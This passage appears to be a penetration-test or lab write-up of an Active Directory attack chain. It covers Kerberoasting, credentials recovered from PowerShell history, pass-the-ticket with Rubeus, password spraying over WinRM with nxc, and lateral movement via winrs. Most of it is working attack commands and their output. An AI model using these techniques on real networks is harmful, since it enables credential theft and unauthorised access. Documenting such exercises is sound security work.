```powershell
# FROM IT-EMPLOYEE15
.\Rubeus.exe asktgt /user:sqlsvc /domain:it.gcb.example /ntlm:REDACTED_SECRET /ptt
winrs.exe -r:IT-SQLSRV02 cmd
```

## ATTACK CHAIN

1. SPNs (`MSSQLSvc`) → Kerberoasting (entry point) → credentials in `ConsoleHost_history.txt` (key) → password reuse → valid authentication to `10.200.8.22 ~ MSP-SRV01` → initial access to `msp.example` → lateral movement

## EXPLOITATION

#### Attack Path

```
SPN enumeration
        ↓
Credential discovery in PowerShell history
        ↓
Password spraying against SPN accounts
        ↓
Credential reuse confirmed
        ↓
WinRM access → MSP-SQLREPORT
```

#### 1. Password Spraying

SPN enumeration produced lists of hosts and users. These were used to test credential reuse.

```powershell
# hosts.txt
"msp-data04.msp.example","msp-data09.msp.example","msp-dc08.msp.example","msp-dc01.msp.example","msp-dc07.msp.example","msp-report05.msp.example","msp-report08.msp.example","msp-san07.msp.example","msp-sqlreport.msp.example","msp-web06.msp.example","msp-srv01.msp.example","msp-srv04.msp.example","msp-srv08.msp.example" | Set-Content hosts.txt

# users.txt
"krbtgt","Vencome","Whirosed","Preselle","Andrescrove","Onnithashe","Taboure79","Addren","mspdb","Woming","Thatoonse","Forgest" | Set-Content users.txt
```

```powershell
.\nxc.exe winrm hosts.txt -u users.txt -p "REDACTED_SECRET"
# WINRM    10.200.8.10  5985   MSP-SQLREPORT  [+] msp.example\REDACTED_SECRET (Pwn3d!)
```

The user `mspdb` reuses the password `REDACTED_SECRET`, recovered earlier from PowerShell history.

#### 2. Remote Authentication

```powershell
# Configure WinRM to allow NTLM fallback when using IP or without full trust
winrm set winrm/config/client '@{TrustedHosts="10.200.8.10"}'

# Lateral movement to MSP-SQLREPORT
winrs -r:10.200.8.10 -u:msp\mspdb -p:"REDACTED_SECRET" cmd

hostname
# msp-sqlreport
```

> `TrustedHosts` enables NTLM fallback — necessary when authenticating by IP or without a complete trust relationship.
